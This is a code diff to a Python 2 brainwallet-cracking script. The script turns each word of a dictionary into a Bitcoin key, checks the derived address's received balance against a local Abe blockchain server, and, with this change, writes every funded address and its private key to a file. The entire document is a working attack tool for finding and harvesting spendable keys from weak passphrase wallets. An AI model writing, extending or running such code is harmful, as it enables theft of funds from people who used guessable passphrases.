@@ -181,10 +181,11 @@ def test():
 
 if __name__ == '__main__':
     dict_file = "dictionary.txt"
+    found_file = "found_addresses.txt"
     abe_server = "localhost"
     abe_port = "2750"
     abe_chain = "Bitcoin"
-    print "Starting search for used brainwallet addresses using dictionary %s" % dict_file
+    print "Starting search for used brainwallet addresses using dictionary '%s'" % dict_file
 
     num_lines = 0
     with open(dict_file, 'r') as f:
@@ -196,8 +197,12 @@ if __name__ == '__main__':
         line_count += 1
         a = get_addr(gen_eckey(passphrase=line.rstrip()))
         address = a[0]
+        private_address = a[1]
         received_bitcoins = urllib2.urlopen("http://%s:%s/chain/%s/q/getreceivedbyaddress/%s" % (abe_server, abe_port, abe_chain, address)).read()
         if(received_bitcoins != "0"):
-            print "Found used address %s using dictionary word %s which has received %s bitcoins." % (address, line, received_bitcoins)
+            msg = "Found address %s using dictionary word %s which has received %s bitcoins. Private key: %s\n" % (address, line.rstrip(), received_bitcoins, private_address)
+            print msg
+            with open(found_file, "a") as myfile:
+                myfile.write(msg)
         if( (line_count % 1000) == 0 ):
             print "Progress: %s of %s words checked so far" % (line_count, num_lines)
